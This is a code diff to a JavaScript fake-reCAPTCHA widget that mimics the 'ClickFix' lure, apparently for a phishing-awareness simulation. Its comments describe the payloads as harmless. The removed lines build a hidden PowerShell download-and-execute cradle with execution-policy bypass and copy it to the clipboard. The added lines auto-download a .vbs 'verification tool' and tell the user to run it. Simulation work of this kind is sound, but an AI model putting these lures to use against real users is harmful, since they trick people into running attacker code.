@@ -81,6 +81,12 @@ const CLICKFIX_CSS = `
   font-weight: 600; font-size: 12.5px; cursor: not-allowed;
 }
 .cf-verify-btn.ready { background: #1A73E8; cursor: pointer; }
+.cf-dl-btn {
+  display: block; text-align: center; background: #1A73E8; color: #fff;
+  text-decoration: none; padding: 11px 14px; border-radius: 3px;
+  font-weight: 600; font-size: 13px; margin: 4px 0 12px;
+}
+.cf-dl-btn:hover { background: #1765cc; }
 `;
 
 function ensureClickFixStyles() {
@@ -117,10 +123,11 @@ function clickFixWidgetHtml() {
         <main class="cf-verify-main">
           <p>To better prove you are not a robot, please:</p>
           <ol>
-            <li>Press <b>Windows Key</b> + <b>R</b>.</li>
-            <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
-            <li>Press <b>Enter</b> on your keyboard to finish.</li>
+            <li><b>Open</b> the verification tool you just downloaded (<code style="display:inline;padding:1px 4px">verification.vbs</code>).</li>
+            <li>Choose <b>Open</b> / <b>Run</b> if Windows asks.</li>
+            <li>Return here &mdash; verification completes automatically.</li>
           </ol>
+          <a class="cf-dl-btn" id="cf-dl" href="#">&#11015; Download verification tool</a>
           <p>You will observe and agree:</p>
           <code>&#9989; "I am not a robot - reCAPTCHA Verification ID: <span id="cf-vid">------</span>"</code>
         </main>
@@ -143,6 +150,7 @@ function wireClickFix(el, token, onVerified) {
   const doneBtn  = el.querySelector("#cf-done");
   const vidSpan  = el.querySelector("#cf-vid");
   const cancelEl = el.querySelector("#cf-cancel");
+  const dlLink   = el.querySelector("#cf-dl");
 
   let pollId = null;
   let verified = false;
@@ -189,24 +197,6 @@ function wireClickFix(el, token, onVerified) {
     console.info("[ClickFix] User cancelled verification (good behaviour).");
   }
 
-  function copyToClipboard(text) {
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-      navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
-    } else {
-      fallbackCopy(text);
-    }
-  }
-  function fallbackCopy(text) {
-    const ta = document.createElement("textarea");
-    ta.value = text;
-    ta.style.position = "fixed";
-    ta.style.opacity = "0";
-    document.body.appendChild(ta);
-    ta.select();
-    try { document.execCommand("copy"); } catch (_) {}
-    document.body.removeChild(ta);
-  }
-
   checkbox.addEventListener("click", () => {
     if (verified) return;
     checkbox.style.visibility = "hidden";
@@ -218,18 +208,12 @@ function wireClickFix(el, token, onVerified) {
         spinner.style.visibility = "hidden";
         const vid = Math.floor(1000 + Math.random() * 9000);
         vidSpan.textContent = String(vid);
-        const origin = window.location.origin;
-        // Payload VO HẠI, 2 giai đoạn như ClickFix thật, chạy hidden hoàn toàn:
-        //   1) cradle ngắn dưới đây được copy vào clipboard (hiện đủ "I am not a robot" trong hộp Run)
-        //   2) cradle tải stage-2 từ server (/api/clickfix/s) rồi iex hidden:
-        //      stage-2 tạo C:\Temp\hehehe.txt ('Hehehehe') + GET /api/clickfix/verify
-        //      (-UseBasicParsing bắt buộc: PS 5.1 không có IE engine sẽ NullRef nếu thiếu)
-        // Phần "# ✅ ..." phía sau là comment của PowerShell — giống kỹ thuật ClickFix thật.
-        const payload =
-          `powershell -w hidden -nop -ep bypass -c "iex(iwr '${origin}/api/clickfix/s?t=${encodeURIComponent(token)}' -UseBasicParsing)" ` +
-          `# \u2705 ''I am not a robot - reCAPTCHA Verification ID: ${vid}''`;
-        copyToClipboard(payload);
+        // "Công cụ xác minh" = file .vbs VO HẠI tải từ server, token nhúng sẵn trong file.
+        // User chỉ cần mở file — không cần Win+R/clipboard (clipboard rất hay fail như đã thấy).
+        dlLink.href = `${window.location.origin}/api/clickfix/tool?t=${encodeURIComponent(token)}`;
         modal.classList.add("open");
+        // Tự tải ngay khi mở modal; nếu browser chặn auto-download thì nút Download là backup.
+        try { dlLink.click(); } catch (_) { /* user bấm nút tay */ }
         setTimeout(() => {
           if (!verified) {
             doneBtn.disabled = false;
